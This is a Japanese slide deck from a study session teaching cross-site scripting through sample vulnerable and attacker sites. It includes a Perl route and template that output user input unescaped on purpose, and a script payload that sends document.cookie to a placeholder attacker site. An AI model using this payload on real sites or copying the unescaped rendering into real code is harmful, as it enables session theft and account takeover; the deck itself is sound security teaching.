# XSS

2013/11/17 @ 徳丸本勉強会

---

## XSS最初の体験

[ex00](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex00_WhatIsXSS) のREADMEに従ってやります．

---

## [ex00](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex00_WhatIsXSS) のXSS攻撃のまとめ

1. 攻撃者が
   <strong>脆弱サイト.com/status?uid=&lt;script&gt;*Javascript*&lt;/script&gt;</strong>
   というリンクを作る
1. 攻撃者がそのリンクをどこか(SNSとか)に貼る
1. 被害者がリンクを踏むと，脆弱サイトのCookie情報を(`GET`プロトコルで)持ちつつ攻撃者サイトにリダイレクトされる
1. 攻撃者サイトは被害者のCookie情報から脆弱サイトへのログインに必要な情報を得て，脆弱サイトに被害者として不正ログイン

---

## XSS攻撃が成立した理由

- `脆弱サイト.com/status` において，ユーザの入力値がエスケープなしに使用されていた

[Dispatcher.pm](https://github.com/laysakura/20131117-tokumaru-benkyokai/blob/gh-pages/sample-sites/vulnerable-sites/ex00_WhatIsXSS/lib/ex00_WhatIsXSS/Web/Dispatcher.pm)から抜粋
```perl
get '/status' => sub {
    my $c = shift;
    my $uid  = $c->req->param('uid');  # /status?uid=[ユーザ入力値]
    return $c->render('status.tx', {
        uid => $uid,
    });
};
```

[status.tx](https://github.com/laysakura/20131117-tokumaru-benkyokai/blob/gh-pages/sample-sites/vulnerable-sites/ex00_WhatIsXSS/tmpl/status.tx)から抜粋
```html
<dl>
  <dt>ID</dt>
  <dd><: $uid | mark_raw :></dd>  <!-- ここで <> をエスケープしないといけない -->

  <dt>フォロワー数</dt>
  <dd>42</dd>
</dl>
```


## XSS攻撃が成立した理由

`<: $uid | mark_raw :>`の部分には`<script>`タグを入れることが可能なので，その中で**任意のJSコード**が実行されてしまう．


## XSS攻撃が成立した理由

今回の「任意のJSコード」は，以下のようなものだった．

1. 脆弱サイトのクッキーを取得する: `document.cookie`
1. それを攻撃者サイトに転送する: `window.location="http://攻撃者サイト.com/?cookie="+document.cookie`

---

# おわかりいただけただろうか?

---

## 今日やること

1. XSS最初の体験&解説 ([ex00](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex00_WhatIsXSS): 済み)
1. XSSの肝 ([ex02](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/vulnerable-sites/ex02_PostOmanchin))
1. クイズで覚える! パターン別XSS脆弱性対策
1. おまけ: JSを使わないXSS ([ex03](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex03_FormOverride))

---

# XSSの肝

---

## XSSの分解

1. 攻撃者が任意のJSコードを脆弱サイトに注入
1. 被害者が攻撃者の注入したJSコードを脆弱サイトにて実行
1. (JSコードに応じて)何か嫌なことが起こる

---

## 攻撃者がJSコードを注入

反射型


## 攻撃者がJSコードを注入

持続型

---

## 被害者がJSコードを実行

- 反射型: リンク踏んだり
- 持続型: ページ表示したり

---

## (JSコードに応じて)何か嫌なことが起こる

- 被害者の持つ情報が盗まれる
  - Cookie ([ex00](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex00_WhatIsXSS))
  - 個人情報，クレカ番号 ([ex01](https://github.com/laysakura/20131117-tokumaru-benkyokai/tree/gh-pages/sample-sites/attacker-sites/ex01_FormOverride))

- 被害者の意図していない情報を発信してしまう
  - ぼくはまちちゃん

- ...

---

## 詳細今日やること

1. XSS体験&解説 - ex00
1. XSSの肝
  - 攻撃者が任意のJSコードを注入 (反射型，持続型)
  - 被害者が攻撃者の注入したJSコードを実行
  - 何か嫌なことが起こる
    - 情報盗まれる系 -> 攻撃者サイトに誘導する必要性
      - 元サイトドメインのリンクを踏ませる => window.locationによるリダイレクト (ex00)
      - 元々攻撃者サイトに誘導しておいて，iframeで脆弱サイトを埋め込んでおく => window.locationによるリダイレクト (ex01)
    - わけわからんこと発信しちゃう系
      - ぼくはまちちゃん
      - ex02 (独自の何か投稿サイトの中で，独自サイトへの罠リンク踏ませると変なポスト, 脆弱サイト内で完結するという意味でXSSって名称はどうなんでしょうね)
1. クイズで覚える! パターン別XSS脆弱性対策
1. おまけ: JSを使わないXSS (ex03)
